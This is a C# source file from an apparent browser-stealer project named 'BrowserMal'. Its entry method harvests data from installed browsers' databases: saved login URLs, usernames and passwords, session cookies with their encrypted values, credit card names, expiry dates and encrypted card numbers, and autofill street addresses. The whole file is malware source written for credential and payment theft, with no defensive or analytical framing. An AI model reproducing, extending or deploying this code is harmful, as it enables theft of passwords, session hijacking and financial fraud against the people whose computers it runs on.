using BrowserMal.Browser;
using System.Collections.Generic;
using BrowserMal.Manager;
using BrowserMal.Model;

namespace BrowserMal
{
    public class Class1
    {
        private static readonly BrowserManager browserManager = new BrowserManager();

        public static void Start()
        {
            browserManager.Init();
            List<BrowserModel> browsers = browserManager.GetBrowsers();

            GenericManager<CredentialModel> credentialManager = new GenericManager<CredentialModel>("logins", new string[] 
            { 
                "origin_url", 
                "username_value", 
                "password_value" 
            }, true);
            credentialManager.Init(ref browsers, Browser.Util.LOGIN_DATA);

            GenericManager<CookieModel> cookiesManager = new GenericManager<CookieModel>("cookies", new string[] 
            { 
                "host_key", 
                "name", 
                "path", 
                "encrypted_value" 
            }, true);
            cookiesManager.Init(ref browsers, Browser.Util.COOKIES);

            GenericManager<CreditCardModel> creditManager = new GenericManager<CreditCardModel>("credit_cards", new string[] 
            { 
                "name_on_card", 
                "expiration_month", 
                "expiration_year", 
                "nickname", 
                "card_number_encrypted" 
            }, true);
            creditManager.Init(ref browsers, Browser.Util.WEB_DATA);

            GenericManager<AddressesModel> addressesManager = new GenericManager<AddressesModel>("autofill_profiles", new string[]
            {
                "street_address",
                "city",
                "zipcode"
            }, false);
            addressesManager.Init(ref browsers, Browser.Util.WEB_DATA);
        }
    }
}
